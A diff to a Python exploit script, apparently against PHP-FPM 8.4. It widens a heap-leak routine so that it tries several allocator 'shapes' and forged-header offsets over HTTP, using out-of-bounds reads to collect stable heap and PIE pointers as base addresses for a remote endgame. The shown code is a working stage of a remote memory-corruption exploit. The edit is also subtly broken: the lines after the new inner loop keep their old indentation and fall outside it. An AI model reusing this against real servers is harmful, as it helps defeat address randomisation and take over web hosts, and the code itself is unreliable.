@@ -1163,30 +1163,47 @@ def _scan_pointers(read: bytes) -> tuple[list[tuple[int, int]],
     return chunk_ptrs, pie_ptrs
 
 
+# (pads, size) shapes tried while discovering the leak geometry.  Where the
+# freed 16 KB slot lands depends on the allocator of the build, so the shape
+# that covers it on 8.4 is only the first guess.
+LEAK_SHAPES = (
+    ([32768, 16384], 16384),
+    ([32768], 16384),
+    ([16384, 32768], 16384),
+    ([16384, 16384], 16384),
+    ([32768, 16384], 32768),
+    ([65536, 32768], 32768),
+)
+
+
 def leak_geometry_candidates(base_url: str, builder_url: str, version: str,
                              arm_path: str = "/bigvar.php"):
-    """Yield an HTTP leak geometry for every header offset that is stable.
+    """Yield an HTTP leak geometry for every shape/header pair that is stable.
 
-    The forged header is tried at a few content offsets; a geometry is
-    yielded when two consecutive OOB reads expose a chunk pointer and at
-    least one PIE-range pointer at the very same offsets (the FPM master
-    keeps both bases for its whole lifetime, so a stable pair is real).
-    Which of those geometries actually carries a *code* pointer is decided
-    by the caller: only a remote endgame proof proves a base.
+    The forged header is tried at a few content offsets of a few reclaim
+    shapes; a geometry is yielded when two consecutive OOB reads expose a
+    chunk pointer and at least one PIE-range pointer at the very same
+    offsets (the FPM master keeps both bases for its whole lifetime, so a
+    stable pair is real).  Which of those geometries actually carries a
+    *code* pointer is decided by the caller: only a remote endgame proof
+    proves a base.
     """
-    for header in LEAK_HEADER_GRID:
-        geom = {"arm_path": arm_path, "pads": list(LEAK_PADS),
-                "size": LEAK_BUFFER_SIZE, "header_content_off": header,
-                "read_len": LEAK_READ_LEN}
-        first = _leak_read(base_url, builder_url, version, geom)
-        if first is None:
-            continue
-        chunk_ptrs, pie_ptrs = _scan_pointers(first)
-        if not chunk_ptrs or not pie_ptrs:
-            continue
-        second = _leak_read(base_url, builder_url, version, geom)
-        if second is None:
-            continue
+    for pads, size in LEAK_SHAPES:
+        for header in LEAK_HEADER_GRID:
+            if header + 0x18 >= size:
+                continue    # the forged header would not fit the buffer
+            geom = {"arm_path": arm_path, "pads": list(pads),
+                    "size": size, "header_content_off": header,
+                    "read_len": LEAK_READ_LEN}
+            first = _leak_read(base_url, builder_url, version, geom)
+            if first is None:
+                continue
+            chunk_ptrs, pie_ptrs = _scan_pointers(first)
+            if not chunk_ptrs or not pie_ptrs:
+                continue
+            second = _leak_read(base_url, builder_url, version, geom)
+            if second is None:
+                continue
         chunk_again, pie_again = _scan_pointers(second)
         stable_chunk = [(off, val) for off, val in chunk_ptrs
                         if (off, val) in chunk_again]
@@ -1203,8 +1220,8 @@ def leak_geometry_candidates(base_url: str, builder_url: str, version: str,
         stable_pie.sort(key=lambda item: item[0], reverse=True)
         geometry = {
             "arm_path": arm_path,
-            "pads": list(LEAK_PADS),
-            "size": LEAK_BUFFER_SIZE,
+            "pads": list(pads),
+            "size": size,
             "header_content_off": hex(header),
             "read_len": hex(LEAK_READ_LEN),
             "chunk_ptr_off": hex(chunk_off),
@@ -1214,8 +1231,8 @@ def leak_geometry_candidates(base_url: str, builder_url: str, version: str,
             "bases": "discovered over HTTP with the calibrate command "
                      "(no /proc access)",
         }
-        print(f"[+] leak geometry at header=0x{header:x}: "
-              f"chunk_ptr_off=0x{chunk_off:x}, "
+        print(f"[+] leak geometry pads={pads} size={size} "
+              f"header=0x{header:x}: chunk_ptr_off=0x{chunk_off:x}, "
               f"{len(stable_pie)} stable PIE-range pointers")
         yield geometry, chunk_ptr, stable_pie
 
